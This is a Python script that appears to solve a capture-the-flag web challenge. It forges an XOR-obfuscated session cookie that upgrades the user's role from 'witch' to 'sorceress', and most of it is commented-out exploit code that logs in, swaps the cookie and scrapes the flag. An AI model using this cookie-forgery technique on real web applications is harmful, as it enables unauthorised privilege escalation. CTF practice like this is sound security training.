import base64
s = 'eyJjcmVhdHVyZSI6InNvcmNlcmVzcyJ9'
key = 178
result = []
for char in s:
    result.append(ord(char) ^ key)
print(bytes(result).hex())
#b64 = bytes(dd).decode('latin-1')
#print(base64.b64encode('{"creature":"sorceress"}'.encode()))
#
# import requests
# import urllib.parse
# import base64
#
# # Шаг 1: Логинимся и получаем актуальный charsum_name
# s = requests.Session()
# login_data = {
#     "creature": "witch",
#     "name": "qwee"
# }
#
# resp = s.post("http://ctfinf.ru:10012/login", data=login_data, allow_redirects=False)
# print("Login response cookies:", resp.cookies)
#
# # Шаг 2: Создаем сессию для sorceress с тем же ключом
# key = sum(ord(c) for c in "qwee") % 256  # 178
# target_json = '{"creature":"sorceress"}'
# target_b64 = base64.b64encode(target_json.encode()).decode()
#
# encrypted = bytes([ord(c) ^ key for c in target_b64])
# cookie_value = urllib.parse.quote_plus(encrypted)
#
# print("Target cookie:", cookie_value)
#
# # Шаг 3: Используем эту куку
# s.cookies.set("session", cookie_value)
#
# # Шаг 4: Идем в профиль
# resp = s.get("http://ctfinf.ru:10012/profile")
# print("Profile status:", resp.status_code)
# print("Profile response:", resp.text[:500])
#
# if "sorceress" in resp.url:
#     resp = s.get("http://ctfinf.ru:10012/sorceress")
#     if "ctf{" in resp.text:
#         import re
#         flag = re.findall(r"ctf\{[^}]+\}", resp.text)
#         print("FLAG:", flag[0])